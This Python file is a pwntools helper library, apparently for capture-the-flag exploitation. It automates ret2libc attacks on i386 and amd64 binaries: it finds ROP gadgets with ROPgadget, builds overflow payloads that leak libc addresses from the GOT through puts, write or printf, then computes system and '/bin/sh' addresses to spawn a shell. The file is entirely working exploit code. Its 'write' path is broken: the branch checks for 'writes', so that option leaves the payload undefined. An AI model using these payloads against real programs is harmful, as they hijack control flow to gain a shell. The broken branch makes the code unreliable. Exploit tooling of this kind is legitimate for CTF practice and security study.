from pwn import *
import os
def get_output(s):
    info(f"running cmd: {s}")
    res = int(os.popen(s).readlines()[0][:-1],16)
    return res

def rop(root, code):
    # pop rdi ; ret
    cmd = f"ROPgadget --binary {root} | grep ': {code}' | cut -d ' ' -f 1"
    return get_output(cmd)

def ret2libc_A(tool:str,to_leak:str,next:int,fill2ret,loader,fmt_str=0):
    """
    ** if you use printf as tool, you need to find fmt_str **
    for example: 
        use [puts](exec puts' plt) to show addr of [__malloc_hook]   
    """
    elf = loader.elf
    if tool not in ['puts','write','printf']:
        warning(f"I never use this func to leak addr of libc: {tool}")
        exit()
    if context.arch == 'i386':
        info("using i386 ret2libc auto...")
        psize = p32
        if tool == "puts":
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(elf.got[to_leak])
        elif tool == "writes":
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(1)+psize(elf.got[to_leak])+p32(4)
        elif tool == "printf":
            if not fmt_str:
                warning("fmt_str needed!")
                exit()
            payload = fill2ret+psize(elf.plt[tool])+psize(next)+psize(fmt_str)+psize(elf.got[to_leak])
        else:
            error("tool error!!!")
    elif context.arch == "amd64":
        info("using amd64 ret2libc auto...")
        psize = p64
        root = loader.root
        pop_rdi_ret   =   rop(root,'pop rdi ; ret')
        pop_rsi_r15_ret = rop(root,'pop rsi ; pop r15 ; ret')
        if tool == "puts":
            payload = fill2ret+psize(pop_rdi_ret)+psize(elf.got[to_leak])+\
                      psize(elf.plt[tool])+psize(next)
        elif tool == "writes":
            payload = fill2ret+psize(pop_rdi_ret)+psize(1)+\
                      psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                      psize(elf.plt[tool])+psize(next)
        elif tool == "printf":
            if not fmt_str:
                warning("fmt_str needed!")
                exit()
            payload = fill2ret+psize(pop_rdi_ret)+psize(fmt_str)+ \
                      psize(pop_rsi_r15_ret)+psize(elf.got[to_leak])+psize(0)+\
                      psize(elf.plt[tool])+psize(next)
    return payload

def ret2libc_B(to_leak:str,leak_addr,libc,fill2ret,loader):
    """
    to_leak:    func_name
    leak_addr:  addr(int)
    libc:       ELF("libc-2.27.so")
    fill2ret:   payload cover ebp
    **use leaked address to get system & binsh**
    """
    psize = p32 if context.arch == 'i386' else p64
    libc_base = leak_addr - libc.symbols[to_leak]
    system = libc_base + libc.symbols['system']
    binsh  = libc_base + next(libc.search(b'/bin/sh'))
    info(f"system {hex(system)} ; binsh {hex(binsh)}")
    if context.arch == "i386":
        payload = fill2ret + psize(system)+psize(0x12345678)+psize(binsh)
    elif context.arch == "amd64":
        ret = rop(loader.root, "ret")
        pop_rdi_ret = rop(loader.root, "pop rdi ; ret")
        payload = fill2ret + psize(ret)+psize(pop_rdi_ret)+psize(binsh)+psize(system)
    return payload

def make_syscall():
    pass






